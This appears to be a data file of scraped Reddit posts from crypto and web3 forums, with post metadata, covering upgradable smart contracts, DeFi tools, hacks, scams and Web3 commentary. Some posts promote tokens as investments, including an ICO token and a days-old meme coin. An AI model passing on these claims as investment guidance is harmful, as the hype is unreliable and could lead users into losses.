Upgradable smart contracts: Doesn't this mean anyone can add a backdoor / rug pull? Seems to go against the whole immutability concept of a blockchain.,"since ethereum smart contracts can be ""upgraded"", this seems to open the door for backdoors and rug pulls. for example: the [lido staking contract](https://github.com/lidofinance/lido-dao/blob/master/contracts/0.4.24/lido.sol#l247) has a withdraw function which is not currently implemented. the lido team could just implement the method to send all tokens to their own address and deploy/upgrade the existing contract. it seems that as long as contracts can be upgradeable, it defeats the entire purpose of the ""immutability"" of the system. you can audit a smart contract, but it could just be upgraded underneath you at any moment. of course you could go re-audit the entire code base before making any transaction on the smart contract but that's not feasible. it seems like any smart contract using a proxy is insecure by default. basically anything that returns true on [https://etherscan.io/proxycontractchecker](https://etherscan.io/proxycontractchecker?a=0xe592427a0aece92de3edee1f18e0157c05861564) should not be trusted, unless you have complete trust in the team/company maintaining it. an example of a non-proxy contract is the uniswap v3 contract. it would be impossible for the logic to change and for you to lose trust in the contract. am i correct in this, or misunderstanding something? &#x200b; edit: by ""mean anyone can add a backdoor / rug pull"", i mean anyone at the company or who has control to upgrade the smart contract.",67,59,0.95,2021-08-16 19:24:08,web3,CryptoTechnology,ohThisUsername,False,73.3

If you are searching for a DeFi portfolio tracker,"i have started using a defi portfolio tracker called merlin. before i used one called debank and it was a cool tool. if someone is also interested in it it is free to use..at least for now and looks sick. still need to get my way around that since i am not and expert user but for some of you guys here it will be useful tool. apparently it will also have nft pln calculation that i would like to use and see how they actually do the calculations since i do a lot of nft trading. the only bad side of it is that they cover a few protocols but more are expected to be added in the upcoming weeks based on the roadmap. also, no need to connect your wallet, you can just paste the wallet address and it will extract the date from the transactions as i don't really like to connect my main wallets to a lot of platforms. sharing an image from the interface. https://preview.redd.it/8dv5a93wkjb91.jpg?width=1854&format=pjpg&auto=webp&s=ff486c8ab8196f0d14ef6b0264d4d6dd92dc42c2 you can check it out on [https://merlin.valktech.io/](https://merlin.valktech.io/)",93,19,0.97,2022-07-14 10:17:10,web3,defi,Severe-Challenge695,False,73.1

"Interoperability, will it be more important than we think?","just this morning i [read](https://coinmarketcap.com/headlines/news/blocto-valuation-soars-to-dollar80m-following-series-a-round/) about how blocto, a multi-chain wallet company was valued in the millions after their latest seed round. thinking why, i looked at the biggest problem people have with crypto. it’s difficult to use, understand, and navigate. a bunch of dapps have ugly ui/ux, and most of the time they're clunky. when i first joined the crypto scene i had 5 different wallets across a ton of different platforms, always needed to use third-party apps to keep track of things. so the solution to this? interoperability, easy ui, and multi-chain platforms. anything that appeals to the those that aren’t hardcore in crypto. projects that make things easily understandable and accessible will be the ones to take off in the future, keeping everything in one platform securely is what will lead the way, obviously people should have multiple wallets for safety reasons, but i do think that projects that focus on these factors will be the ones to take it to the next level. let me know what you guys think, this isn’t totally new, but it’s always interesting to see and i’m always curious to see how crypto will evolve.",79,39,0.98,2023-02-22 13:05:24,web3,CryptoTechnology,eric690,False,72.8
Distributed Credit Chain ICO Review!,"distributed credit chain (dcc) ico closed their token sale at the end of may. this ico did very well and achieved their hard cap and collected 49 million usd! the main goal of this project is to defeat the centralised banking system and according to their whitepaper, these guys are very ambitious. the team of distributed credit chain is going to create a peer to peer distributed banking ecosystem. the first advantage of dcc is, that they are going to provide an opportunity to earn for everybody. the normal banks are making huge financial profits every year, without giving an opportunity to reward the users. dcc does. the second interesting moment is, that due to usage of the blockchain technology, you will be able, to secure your data, as a ordinary user. it means total security of your own data and the lack of third parties. moreover, there will be a special rating system among the loaners and borrowers, so you will directly see the trust rating of the person, you are dealing with. furthermore, one more aim of distributed credit chain is to reduce the costs among the whole sector, and due to these reasons, this project is an ambitious long term investment. as i already said, the dcc ico is already over, but this also mean that you can buy their tokens already! the dcc token is listed on three major exchanges: kucoin, bibox and idex. the price for now s 0,033 usd per dcc token. i will keep an eye on this project guys!official website: r/[https://dcc.finance/index.html](https://dcc.finance/index.html)",104,1,1.0,2018-07-22 16:25:11,web3,BlockchainStartups,muwie,False,72.8

venture introductions and seed funding harmony has relationships with some of the biggest and active funds available. for certain projects and winners, we are happy to make introductions to our keiretsu of venture relationships for additional funding. with our partner dorahacks, projects will receive community matching and potentially also venture capital investor interest from their 60+ investor community. &#x200b; https://preview.redd.it/o2sxxr4brcg71.png?width=1920&format=png&auto=webp&s=5b3a54296baff67485870525113e06ce8f9bd8b9 # 📷### terra’s challenge: we are an opinionated layer 1 platform. as we have relationships with most major liquidity providers and investors in defi and crypto, we recommend exploring the following themes to make the most of the hackathon. 1.understand core themes. 2.identify technologies and areas of interest. 3.identify suitable skill match. **extending stablecoin adoption** beginner to intermediate developers. take advantage of terrausd native stablecoins to introduce crypto-native experiences: subscription payments and micropayments, yield-bearing escrow, milestone or instant payroll, creative remittance solutions. **decentralized asset management** for beginner and intermediate frontend developers. over 20% of users of mirror are in thailand. interact with terra.js, mirror.js to build decentralized front ends for mirror. this is a core priority for tfl to enable censorship resistant asset management across borders. **crypto native financial primitives** intermediate to advanced developers extend primitives available within the terra ecosystem. for example, dao treasury issue bonds issuance, revenue sharing agreements, income sharing agreements, dao creation and management cross-chain liquidity, traunching. **picks and shovels** advanced developers one of the highest leverage opportunities in the ecosystem is to enable other developers and builders. create indexers, block explorers, and developer facing tooling to fix issues every developer will face into the future. # ### maddock capital’s challenges: **theme: “reduction of the broker / middleman tax in all financial marketplaces”** preamble: blockchain technologies power is to reduce transaction friction and transaction costs across all marketplaces in a mature and efficient ecosystem. currently nearly every financial transaction undertaken has a “broker tax” applied to it. harmony’s infrastructure enables that to be materially reduced. currently most online businesses, particularly early stage startups and more mature tech businesses with recurring revenue have limited recourse to raise money outside of equity rounds. typically, equity raises when advised by financial intermediaries charge 5-7% of proceeds. a blockchain enabled crowdfunding solution for equity in these businesses (ideally native to and utilising blockchain technologies) could significantly disrupt this market by bringing new sources of capital to these businesses. in short, improve access through designing a 2-sided marketplace for equity raises. similarly these businesses currently are not able to raise debt. current solutions are focused on securitising or forward selling revenues linked to recurring contract income. in short we want you to disrupt online platforms providing marketplaces to forward sell revenues and contract receivables. our view is that this would require the use of a stable coin pegged to the usd in the first instance. this should enable any blockchain participant to put their capital to work for real growth. # ### chainlink’s challenge: the development of price feeds delivered via a decentralized oracle network has facilitated the emergence of defi applications at scale. chainlink current offers a variety of additional smart contract services such as verifiable randomness, fair sequencing services and keepers that are also allowing developers to create new and innovate applications. the concept of decentralized oracle networks outlined in the the chainlink 2.0 whitepaper outlines a future where different constellations of nodes collaborate to process a wide range of workloads. in similarity to how defi projects are composable, we envision a future in which the services that facilitate the emergence of new applications are also composable. the purpose of this challenge is to identify the next generation of smart contract services that can be delivered via decentralized oracle networks to allow developers to create new products, new sources of value and ultimately facilitate the emergence of the next wave of blockchain innovation. # ### submission requirements * all submissions must be open source with a github repo. * to qualify all projects must utilize the harmony as part of their application stack * the application must be useful or interesting or novel. extra points if app is deployed on harmony mainnet. * if there is wide appeal for the application, it will score better. * a demo video must be submitted for a complete submission * all submissions are through gitcoin and teams must be formed via gitcoin with all team members registered. # ### judging criteria a panel of distinguished judges will evaluate your submission. here’s the criteria by which your work will be judged: * teams are limited to 4 members at most. we encourage team members to be from a variety of backgrounds. we prefer that web2 devs just dipping their toe in web3 have more seasoned developers on their team and to learn from each other. * alignment to the challenges theme of tradfi to defi * is the application useful? is it interesting? * originality and innovation: because harmony is evm-compatible, porting anything from ethereum is super easy. if you’re going to fork something, that’s ok. but add your own flare to it and make it worth using and be explicit how this fork is . if it’s just a plain-vanilla fork with nothing new, you’ll win nada. zip. * technicality of implementation: how difficult was it to create your application? if it was easy, that will reduce the likelihood of winning anything. * design and usability: have some pride in what you create; add some craftmanship to it. # ### schedule in addition to the hackathon, we will have a series of workshops, fireside chats, panel interviews, office hours, and check-ins. the schedule is tbd but will be announced as soon as possible. in the meantime, here are the key dates: * july 15, open registration * august 16, hackathon begins, opening ceremonies * august 17, team formation (details tbd) * august 20, submit team names and team members * september 15, mid-point demo day (optional, depending on interest) * september 30, submission deadline, hackathon ends, closing ceremonies * september 30-october 5, judging * october 6, winners announced * october 11, payouts completed #

New to crypto? Overwhelmed? I made a crypto ecosystem visual. Check it out.,"i've just gotten into crypto in the past couple of months. it's incredibly overwhelming when you're starting. what the hell are all of these cryptos for? why do we need them all? which one should i pick? &#x200b; i think a lot of people struggle with similar questions when they're starting out. eventually you have the ""ah ha!"" moment. many of these aren't competing with each other. many of them are working together with each other. they're making each other better. even if blockchains, protocols, or products are competing - that doesn't mean you have to pick ""the right one"". i'm not saying all of them will survive, but many of them will. i know many veterans know this, but many new people likely don't. our future holds many interconnected blockchains, each with many products on it. many of the products will be on several competing blockchains. they will exist together, communicate with each other, and eventually they'll probably provide a relatively seamless user experience even across different blockchains. &#x200b; this isn't all inclusive, but here's what the ecosystem roughly looks like. if i've made any mistakes please let me know! &#x200b; https://imgur.com/a/3recnrb",88,23,0.99,2021-06-03 18:45:44,web3,defi,The-Tots,False,71.9

Feedback on my new DeFi Project,"hey guys, just built and launched a defi payments project ([sfpy](https://sfpy.co)) last week and i was hoping to get some feedback from the community. the basic premise is to offer a way for individuals/businesses to accept eth and erc-20 tokens as payment from their customers for free. (no processing fees but gas fees still apply) the twist is that funds are aggregated across all recipients and parked in liquidity pools which would earn income from flash-loans. users are free to withdraw their funds at anytime ofc. currently, users can create and send payment links to each other using the web interface but in the coming weeks we'll be releasing plugins for ecomm stores and webhooks for custom integration. * the landing page is [here](https://sfpy.co) * the app is [here](https://app.sfpy.co) * the docs are [here](https://sfpy.co/docs) * the github is [here](https://github.com/sfpyhub) the smart contracts and ui were heavily inspired by uniswap but ultimately had to go our own way given the different use case. let me know what you guys think! happy to answer any qs and help anyone get started if their interested",72,48,0.94,2021-06-28 02:37:50,web3,ethdev,ziyadp,False,71.8
I discovered $32M stolen in rug pulls after finding out that scammers created a fake token using my company’s name: Funds deposited to Binance,"hey guys. i discovered that there was an erc20 token with our company name, blockfence security, even though we had never issued a token. this led us to dig in more, and after a few long days of research, we unveiled a very organized rug pull scam. this scheme created more than 1,300 tokens on ethereum mainnet, bsc and arbitrum (and still ongoing), scamming to date over 45,000 victims. the scammers were employing techniques that were new to me, tricking both victims and scam detectors so they could think the tokens were legitimate. these techniques included obfuscating malicious smart contracts, hiding the real token max supply, burning users' tokens, and many more. like in our case, they targeted web3 companies that have no issued token, but also made up tokens with name combinations of popular memecoins like aipepe, purple pepe, pepe chain, pepe race, and baby pepe. i was also able to trace some of the initial funds used by the scammers that were deposited back to binance hot wallets. we contacted binance, but this is a shame that exchanges don’t place fighting the scammers in first priority. scammers are easily able to deposit and withdraw from exchanges, i’m not sure if this is limited to binance only. would love to hear what you think about it, and if someone want to see the detailed investigation we performed, here is [a link to it](https://blockfence.io/security/32m-stolen-over-1300-fake-tokens-rugged/).",78,39,0.94,2024-01-19 11:01:26,web3,ethdev,magnuspetrus,False,71.8

Ethereum won't reach real adoption until we solve the mobile wallets problem.,"# here’s a quick story “from the trenches”. **first a bit of context:** i guess most people here use crypto primarily via desktop wallets (like metamask). so you don’t use crypto the way you’d use cash app or revolut for everyday payments or 10 small txs per day. but the truth is that people spend most of their non-work time on mobiles, scrolling youtube, instagram, or whatsapp. so, if we want ethereum to reach significant consumer adoption, our mobile experiences must be great because this is what people are used to, and troubleshooting stuff on mobile is very irritating. plus most people in asia and africa are mobile-first. **why do i even talk about it?** so we've been building kiwi for like 1.5 yrs. our idea has been to stay open and ethereum-aligned. this means that we haven’t set up “sign in with google” or embedded wallets powered by privy, capsule, and others. we haven’t even built an android or apple app - we have a pwa app so that everyone can use it. since our app is primarily focused on people reading and discussing ethereum-related content, the mobile experience is very important for us. but unfortunately, mobile wallets just don’t work. i've been flying around the world to attend conferences - from istanbul to la and saw people getting onboarded to our app. they used rainbow, coinbase wallet, metamask and many other wallets. metamask basically doesn't work most of the time. rainbow sometimes breaks down, too. coinbase wallet used to be the best, but now they redirect people to create a passkey wallet, which is confusing. and it’s not only kiwi - many users have similar problems on established apps like zora. some just say: “ah yeah, it’s normal. i will figure it out once i get in front of my laptop”. can you imagine trying to onboard users to your app in these circumstances? last year, my co-founder even made a viral thread about testing different mobile wallets, and since then, not a lot has changed: [https://x.com/timdaub/status/1673591390687690753](https://x.com/timdaub/status/1673591390687690753) and it’s not that the ethereum community doesn’t care about the ux. vitalik even said at one of his talks: “we should be as decentralized and open as linux and android, and at the same time have as consistent a user experience as apple.” but if steve jobs were still alive and saw what the hell is going on with our mobile wallet connections, he'd just ban crypto wallets from appstore forever. wallets are something that needs to work 99.9999% of the time. you can't build consumer crypto apps - and have real adoption - when wallets work 80% of the time. but this is the sad reality that’s making the adoption much harder. and the reason everyone is so excited about embedded wallets is because they go around these obvious bugs. but it's not a solution either because the dapp gets the vendor locked in, and the user has to create and send money to a new wallet without his identity and onchain history. and the whole idea is to have your ens and onchain history in one place, in your hot wallet. the question is, why does it keep happening? maybe because it's just complex - people use different browsers - from firefox, through chrome up to opera - and wallets must be compatible with all of them. but then, how do the desktop wallets work 99.99% of the time? if we had solved the merge, i imagine we would have found a way to connect mobile wallets reliably. but it’s been 1.5 years now, and this mobile wallet connectivity problem is still omnipresent.",63,63,0.8,2024-10-31 10:25:40,web3,ethereum,MacBudkowski,False,71.0

Web 2.0 vs Web 3.0: The Difference Revealed,"web creator tim berners-lee described its first version as a “read-only” network. this means that previously distributed content on radio or television could now be obtained from any computer connected to the internet. the era of static web pages downloaded from servers was far from the engaging content taken for granted today. most internet users at that time were delighted with the novelty of features such as email and real-time news search. web 1.0 was losing to web 2.0 primarily by the degree of self-expression of users: compared to the second, the first one had little development. the primary user communication channels were various chat rooms, forums, and other public platforms. of course, those who created personal websites had more means for self-expression, but this option was available to a select few. ### what is web 2.0? web 2.0, today’s version of the internet, was born in 2004. it should be understood that web 2.0 is not a new standard; it is not a new format. web 2.0 is just a designation of new trends, a new stage of the evolution of the internet. it cannot be said that web 2.0 came abruptly and replaced outdated sites. on the contrary, it results from constantly ongoing progress, their logical improvement. tim o’reilly is considered to be the father of web 2.0. it was he who put forward this term and characterized the new internet as a place where content is free and is formed by users themselves. web 2.0 became a new round of the evolution of the internet, thanks to which users gained freedom of expression and could publish their content. it is important to emphasize that the new internet has become available to mobile phone users. thanks to this, more powerful mobile devices have begun to appear, allowing users to access fast internet and create engaging content. thanks to this, web 2.0 was quickly filled with social networks. the well-known facebook, instagram, tiktok, twitter, and other platforms have appeared. thanks to the explosive popularity of web 2.0 platforms, companies like facebook, google, and twitter have become market leaders and occupy one of the first places by market capitalization. these factors have become the main reasons for the centralization of the internet. today, leading companies such as google or facebook control all users’ data. ### what is wrong with web 2.0? * the main drawback of web 2.0 is the unreliability of data storage. a serious disadvantage of this system is that sensitive data is stored mainly on a server that is poorly protected from hacking — which means that the data is at risk of hacking and use by third parties. in particular, the user cannot be guaranteed the confidentiality of the personal data that he shares. moreover, the owners of web resources pursue the interests of businesses by receiving this data from users. as a rule, they need personal data first to keep users on websites and encourage them to make purchases, including unplanned ones. * the risk of personal data theft. as we mentioned above, it remains quite real. and centralized data storage contributes to this. a huge amount of data (by some estimates, several billion) is contained in several processing points. such a storage system is similar to an institution with entrances from different sides of the building, but this does not change the very essence of the organization. in addition, to get the data, there is no need to hack the owner’s electronic wallet directly — it will be enough to “hack” his smartwatch. * the next risk factor is that the site’s content is in charge not only by the one who creates it but also by the one who administers it. the persons involved in the content processing automatically become aware of the user’s activities — they see all the user’s posts, information about their profiles, statistics of movements on other links, etc. the creators and managers of the sites use these user data not only for their disposal but can also transfer them to third-party companies for further use for advertising purposes. * it must be remembered that along with the development of communication, unlimited networking opportunities, and the chance to earn through digital content, the reverse side of this process also receives benefits. namely, website owners primarily aim for personal gain at the users’ expense. * lack of competition and intensification of supervision. the vast majority of sites (except for about 10% of the total) are controlled by a limited number of suppliers. we are talking about twitter, airbnb, facebook, and several others. this means that, under certain circumstances, they have the right to close or restrict access to sites whose actions they consider illegal. the states have the same powers. for example, the chinese government has experienced blocking wikipedia, google, and twitter — this decision was made to preserve the confidentiality of data that has increased secrecy nationwide. ### what is web 3.0? the concept of web 3.0 and its prospects did not appear yesterday. this topic has been gaining momentum for several years, confirming its importance and necessity. web 3.0 is an updated internet, presumably with the integration of blockchain technologies and decentralization tools. so far, we cannot say whether it will be a blockchain or blockchains or whether there will be something new. but here are the obvious advantages of these technologies and tools: * increasing privacy. the number of misuse and data leak cases is rising; therefore, privacy is a serious problem for people. * simple data exchange. within web 3.0, you will have a single profile that works well on different platforms. you will own a personal profile and all the data associated with it. you can do it without a problem whenever you want to share your data. * fewer intermediaries. one of the crucial benefits of web 3.0 is fewer intermediaries. the decentralization of the network allows suppliers to communicate directly with consumers. this ensures no central authority will take your share of the profits via electronic transactions. * simplified access to information. web 3.0 makes it easy to access information from any location and topic. thus, the potential for obtaining unlimited valuable and rare information is provided. regardless of the format of the data you are looking for on the internet, you may be given personalized access to receive it. * content authors will be able to become their copyright holders. within web 1.0, only the website owner can add something to his page. on web 2.0, there is an option to create something of your own (for example, publications on twitter). at the same time, everything the user does on the site is managed directly by the platform: posts that are stored in its database and actions that become the basis for further advertising sales. for example, if twitter worked on the blockchain, all publications would be the author’s property. in this case, the algorithm would look like this: 1. a conditional user andrew registers on a social network by linking his crypto wallet to his account. 2. after each tweet of andrew, the system creates a file and places it in a decentralized system like ipfs. 3. simultaneously, a unique nft token associated with this file is generated, placed on the twitter blockchain, and transferred to andrew’s wallet. 4. after that, andrew becomes the rightful owner of the publication. then he can sell it for fungible currency — for example, eth. * thanks to smart contracts technology, the blockchain will automatically check whether both “wallets fulfil the terms of the transaction,” and only after that will it complete the transaction. so, for example, if andrew, as promised to conditional james, transferred his nft, he is assigned a previously agreed reward. * decentralized organizations. any company can be represented as a network of interested parties. it is obvious that each of the parties participates in the process on certain conditions: 1. if the employee has completed the work, he has received a salary. 2. if the borrower meets the bank’s requirements, he gets a loan. 3. if an investor sponsors a company, it means that he receives one or another benefit from it. 4. if the customer received the service, the company received the payment. all these conditions can be prescribed as smart contracts in the blockchain while excluding intermediary managers. and having formed a decentralized autonomous organization (dao), it is possible to distribute management rights in the form of native tokens among participants. depending on their number, it will be determined which decisions a person can influence and which ones cannot. * economy without intermediaries. decentralized finance, or defi, is a kind of crypto wall street. such services allow you to invest in the currency, change it, provide loans, and borrow. the advantage is that bankers are no longer required to make transactions, reducing costs and eliminating bias. ### conclusion currently, there is a transition from a closed and centralized web 2.0 to an open web 3.0, which users mainly manage, and not by large companies. web 3.0 has become the first stage of the internet’s development, in which we can monetize our activities and interact at a new level without intermediaries. thanks a lot for reading! the article was originally written for [simplehold blog](https://simplehold.io/blog/article/web-two-vs-web-three-the-difference-revealed?utm_source=social&utm_medium=reddit&utm_campaign=education_post)",74,44,0.86,2022-09-19 07:58:21,web3,CryptoTechnology,Simple_hold_wallet,False,70.6

Coinbase Unveils Proprietary Smart Contracts Vulnerability Checker,"coinbase cryptocurrency exchange and bitcoin (btc) trading venue has announced the launch of its smart contracts vulnerability checking software called solidify. the firm says solidify is designed to automate, streamline, standardize and scale its smart contract security checks for ethereum and other blockchain-based cryptoassets, according to a blog post on june 23, 2021. **coinbase launches solidify** hacks and heists have become quite commonplace in the rapidly evolving world of blockchain technology, as rogue actors are constantly on the lookout for exploitable loopholes in smart contracts. in a bid to make its due diligence process of onboarding new ethereum-based tokens as well as that of other blockchain networks into its platform, coinbase has launched solidify. the team claims the new software automates, standardizes, and scales the process of smart contracts security risk verification. coinbase wrote: “manual smart contract analysis is a time-consuming and error-prone process. experienced teams miss occasional vulnerabilities which can lead to significant monetary loss. to keep our customers and coinbase safe, our token listing process requires security reviews and risk mitigation recommendations for every smart contract. consider our challenge of figuring out how to do this specialty risk identification and recommendation process at scale.” **solidifying token reviews** the team says solidify comes with an in-built large signature database and a pattern matching engine that picks out the entire features of smart contracts and their vulnerabilities. it also standardizes and scores these risks, while also suggesting possible solutions to the risks. what’s more, coinbase says once the software is done accessing the contract of a token, it generates a detailed report on its findings, helping the team to decide whether to go ahead with the cryptoasset listing or not. “solidify evaluates security risks of hundreds of smart contracts either fully automatically or through identification of unique functions that require additional manual review,” the firm added. read the full article here: [https://btcmanager.com/coinbase-proprietary-smart-contracts-vulnerability-checker/](https://btcmanager.com/coinbase-proprietary-smart-contracts-vulnerability-checker/).",88,16,0.94,2021-06-24 16:40:28,web3,CryptoTechnology,Mars_chego,False,68.6

How to Protect Yourself From DeFi Platform Hacks,"yesterday, badgerdao users had $120 million stolen because the platform was hacked. the current theory is that the hackers injected malicious scripts using cloudflare. these scripts modified the transactions made by the website to redirect funds to the hacker’s wallet. here are some tips for avoiding these hacks: **always review the transaction details** here, [you can see a sample metamask transaction confirmation dialog](https://i1.wp.com/walletrecovery.info/files/2021/12/image-3.png?w=368&ssl=1). note that the dialog shows the network (ethereum mainnet) and the action (get reward). it also shows the total amount of the transaction – .014 eth always review the chain, the action, and the amount. remember that defi is just smart contract code, and you can always see the method being executed and the parameters passed to those methods. **use the metamask blacklist** you may not use metamask for defi. even if you don’t, you should install the extension because it has a built-in phishing blacklist. this blacklist protects against many scams, such as malicious bitcoin paper wallet sites – not just ethereum scams. **use a hardware wallet with defi** don’t use a browser extension like metamask to store large sums of money. you can use a trezor or ledger wallet with metamask for defi. remember that all the software on your computer may have access to your metamask datastore. if you reuse your metamask password, it’s trivial to steal your keys. **confirm the contract id on coinmarketcap or goingecko** anyone can create a token on eth/bsc/avax. a common scam is counterfeit copies of real coins. on uniswap, [you can use the default token list.](https://i0.wp.com/walletrecovery.info/files/2021/12/image-6.png?resize=768%2c716&ssl=1) or specify [custom tokens](https://i1.wp.com/walletrecovery.info/files/2021/12/image-5.png?resize=768%2c694&ssl=1). malicious exchanges and token sites may prompt you to add fake contracts to uniswap or other dex’s. be aware that you can name a token anything you want on eth/bsc/avax and other chains. double check that you’re buying a real token by checking on https://coinmarketcap.com/ click the metamask icon to add the contract to metamask. **separate trading wallets from cold storage wallets** if you plan to leave a lot of crypto in cold storage and use a fraction for trading, consider setting up a separate passphrase wallet just for defi. this limits your exposure in case of hacks. in the badgerdao hack, [a single wbtc address was emptied of 896 bitcoin.](https://cryptopotato.com/celsius-network-reportedly-lost-50-million-in-the-120-million-badgerdao-hack/) i’m guessing that not all 896 btc were intended to be used with badgerdao. the owner of those coins probably used a shared wallet for multiple platforms. if they limited their balance of the wallet to those intended to badgerdao, they could have minimized the loss. metamask [makes it easy to switch between different hidden wallets](https://i2.wp.com/walletrecovery.info/files/2021/12/image-8.png?w=371&ssl=1).

Mint and Trade NFTs with 2 lines of JavaScript,"hi guys, i've been working on a system that makes it dead simple to programmatically mint and trade nfts. until now minting nfts meant you have to learn solidity, web3.js, ipfs and deploy, manage, and maintain these systems. it's a lot of work and huge learning curve for most people. it doesn't have to be this way, since nfts are nothing more than digital objects that happen to use the blockchain for tracking transfers, and that concept itself is very simple. i designed a system that gets rid of every single hurdle mentioned above, and lets you program nfts with nothing but a few lines of javascript. it's so simple that you don't even need a server to mint nfts and you don't need to deploy contract and all that complicated stuff. you can program everything with nothing but a browser, serverlessly, and no need to maintain ipfs nodes. it just works. check it out. hope it helps: - website: https://rarepress.org - 2 minute explainer video: https://www.youtube.com/watch?v=f_xheo_3lam - see for yourself, one click demo for minting your own nft with nothing but a jsfiddle: https://docs.rarepress.org/#/?id=try-yourself",82,23,0.97,2021-07-14 10:23:03,web3,ethdev,skogard,False,68.1

Defi and NFT Boom: Solana and Ethereum,"with the current market its possible to suggest that solana has emerged as a standout. i've seen the recent discussion that it draws comparisons to tech giant apple, primarily for its innovative approach to melding hardware and software. solana inverts the equation, focusing on leveraging hardware to enhance and broaden the web3 experience. co-founder raj gokal often articulates solana’s vision as the “apple of crypto.” it highlights the ambition to innovate through software, introducing new functionalities and experiences rather than only facilitating hardware sales. the true essence of solana lies in its network performance, which is powered by multi-threading for parallel processing. this technical prowess has attracted pragmatic developers keen to explore solana’s potential during the defi and nft boom. its ability to offer fast transactions at low fees quickly positioned it as a competitor to ethereum. “solana is capable of processing thousands of transactions per second, with block times recorded at 400-500ms — significantly higher performance than existing blockchains. ultimately, solana’s adoption of this technical approach aims to achieve two missions: an expandable platform that can handle high usage and composability between applications,” researchers at four pillars wrote. the numbers show that decentralized exchange volume on solana has outpaced dex volume on ethereum drastically. $sol itself is at $173. this seems to be leading to another leg up for meme tokens in this excitable market. central to solana’s ethos is the community and ecosystem development. initiatives like the $bonk meme coin airdrop galvanized the solana community by allocating 5% of its total supply to developers. this distribution unified the community and sparked significant growth within the ecosystem as developers engaged in reconstruction efforts. remarkably, the meme coin’s value surged by 20,400% from its lowest point, creating a positive feedback loop that renewed interest in solana. echoing this currently is $powsche (play on porsche) another current low cap coin in the process of consistently beating ath's day in and day out, with a market cap at writing of $802k despite only being days old. they have participated in airdropping tokens to holders whilst building a solid community that aims to defy expectations. they seem to be keenly listening to their following who have asked for a literal burn of tokens by burning a lamborghini at $100m market cap. community is of upmost importance and this token has one and it also has a team of developers that are open, involved and transparent to their community which can sometimes be hard to find. &#x200b;",86,17,0.93,2024-03-23 14:42:52,web3,solana,[deleted],False,67.7

Multichain Privacy - What can it look like?,"the decentralized finance (defi) industry has grown significantly in recent years, presenting both opportunities and weaknesses. one major challenge facing defi is the lack of privacy and security for its users, as evidenced by several recent high-profile hacks resulting in the loss of billions of dollars. it has been reported that in 2022, the figure was $3.8 billion just from crypto-hacks :( defi's unfortunate vulnerabilities are due to high debt, liquidity mismatches, built-in interconnectedness, and lack of shock absorption capacity. this means that for defi users, it's essential to keep our assets private and secure in the multichain ecosystem. i have been reading about namada's solution which addresses the problem of segregation of different privacy sets across different chains, dapps and currencies as currently, these are not integrated into one ‘asset-class’ and so all of these privacy protocols have different levels and permissions of security and privacy. as a defi user, i wasn’t aware of these potential data breaches and so i see the value in namada’s single asset-shielded pool (including fungible and nonfungible assets) as these assets become a unified privacy set. namada’s asset-shielding tech then enables users to perform transactions without revealing their identities or the underlying transaction details within the multi chain ecosystem. for those interested in zk applications, namada's multi-asset shielded pool (masp) is a zero-knowledge circuit that provides complete anonymity to users by masking their transaction data. it uses the zk-snarks (zero-knowledge succinct non-interactive argument of knowledge) proof system to prove that a transaction is valid without revealing any transaction data or user identities. the platform's technology promises that all transactions are secure, private, and fully auditable. in conclusion, namada's solution is an essential addition to the defi ecosystem, as it enables users to transact across different blockchain networks while maintaining their privacy. this technology is paving the way for a more private and secure future for the blockchain industry.",75,32,0.97,2023-03-07 08:22:24,web3,defi,thepopularearnings,False,67.5
USDC payouts through stripe on twitter is an incredible example of crypto's use case that will genuinely improve people's lives.,"in-case you didn't hear the news, stripe is partnering with polygon to allow usdc payouts on twitter. correct me if i'm wrong but i think this is going to be the first real world use case of web2 beginning to cross-over to web3. this is something that could truly improve a ton of people's lives and bring a lot of eyes to the world of crypto. no more wankers complaining that this has no real world use case or it's just gambling. it's real and it's happening in front of our very eyes and it's powered by polygon. it may not seem like a big deal but it is and i don't know why this isn't mentioned as much as it should be. things like this are going to be pushing us a massive step forward when it comes to cutting out the middle man. yes twitter is the middle-man right now technically but who knows. we could be seeing a decentralized social media with the same thing? the facts are that we are indeed still early as cliche as it sounds and i feel like this is going to bring more eyes to web3 than people realize. it's going to start with being paid in usdc on twitter, then maybe you can get paid in usdc for your medium articles? youtube videos? also i don't understand why so many news outlets where sharing this news without even mentioning the fact that this was powered by polygon, it feels shady to me but there's nothing that can be done about this i guess. anyway i'm incredibly curious to hear everyone's thoughts on what this means for web3 moving forward. like i mentioned above, i personally think this is an incredible step forward in the right direction and the fact that the biggest players are starting to believe in the concept of crypto and web3 is huge. this isn't just some white paper or speculation. this is actually happening, i don't think anyone predicted years from now that we'd be able to pay someone on twitter with crypto and who knows where we're going to be years from now.",73,37,0.89,2022-04-26 08:43:08,web3,CryptoTechnology,ForbiddenOwl,False,67.5

Some advices for new developers and people looking for developers,"often i work on my own in my projects but have since a few months moved to a more community driven project. here i will write some advice about what i have learned in the crypto development space: &#x200b; 1. people will try to get you to work for free. like any other development or freelancer area, people will do everything they can to get you ""involved"" in their projects and work for ""a percentage"" of their ""very innovative ideas"". don't do it. people who do not understand the cost, time and effort you need to do a good project also do not understand business. often also means their idea is not that good because of that. charge upfront at least half of what you set up as your pay, don't be cheap either. blockchain developers are making minimum 250k a year, don't accept less than few thousands per project. 2. if you are looking for developers, know this: no. your idea is not new, no we don't have any interest in stealing your idea. if you can't communicate your idea openly, experienced developers will not join your project. the best ideas are often broadcasted in the open and this is one of the reasons they work, because people are able to stress the idea and know if it will work, if someone else is doing it or if they want to do it in the first place. 3. never work with people you don't like. if they put you off with their personality, unless they pay you upfront, don't accept the job. you will thank yourself later. the reason you work in decentralized technology is exactly because you can pick and choose when and how you work. 4. networking and making a good team is more important than numbers or ideas. the quality of the product you put out is more important than pumping and dumping a new meme. 5. if your project is just another token with no use case you are wasting your time. meme coins only work if you have big money for market stunts. 6. create an ecosystem for your projects. plan for various dapps and work your way into it. this will give your coin or network real value. overall working in crypto is great and give us great freedom. if you can choose who you work with you will do great. make sure to cultivate friendships along the way as sometimes you will gain more from having a good team than from making a few quick thousands. keep learning, there are a lot of new things we have to do in this space yet.",68,43,0.94,2021-06-19 08:48:34,web3,ethdev,ArthurDeemx,False,67.4

